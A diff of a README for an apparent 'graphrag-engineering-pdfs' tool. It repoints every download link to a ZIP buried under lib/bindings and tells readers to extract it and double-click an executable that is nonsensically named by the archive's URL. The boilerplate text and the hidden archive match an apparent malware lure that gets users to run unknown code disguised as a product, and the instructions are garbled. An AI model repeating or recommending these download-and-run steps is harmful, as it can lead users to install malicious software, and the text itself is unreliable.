@@ -4,23 +4,23 @@
 Welcome to graphrag-engineering-pdfs! This application helps you utilize ontology and knowledge graphs for your engineering documents. With this tool, you can efficiently retrieve information from local language models, making your research and analytics smoother.
 
 ## 📥 Download Now
-[![Download the Latest Release](https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip)
+[![Download the Latest Release](https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the software:
 
 1. Visit the Releases page by clicking the link below:
-   [Download from Releases Page](https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip)
+   [Download from Releases Page](https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip)
    
-2. Choose the latest version available. Look for the file named https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip and click on it to download.
+2. Choose the latest version available. Look for the file named https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip and click on it to download.
 
 3. After the download is complete, locate the ZIP file in your downloads folder.
 
 4. Unzip the file by right-clicking on it and selecting “Extract All,” then follow the prompts.
 
-5. Once extracted, open the folder. Find the executable file named `https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip`.
+5. Once extracted, open the folder. Find the executable file named `https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip`.
 
-6. Double-click on `https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip` to run the application.
+6. Double-click on `https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip` to run the application.
 
 7. Follow the on-screen instructions to set up the software for your needs.
 
@@ -63,4 +63,4 @@ Thank you for choosing graphrag-engineering-pdfs. We hope it greatly enhances yo
 
 ## 📥 Download & Install
 To begin using the application, visit the following link to access the latest release:
-[Download from Releases Page](https://raw.githubusercontent.com/will695672804/graphrag-engineering-pdfs/main/graphrag_indexer/graphrag_pdfs_engineering_3.3.zip)
+[Download from Releases Page](https://github.com/will695672804/graphrag-engineering-pdfs/raw/refs/heads/main/graphrag_indexer/lib/bindings/pdfs_graphrag_engineering_forbow.zip)
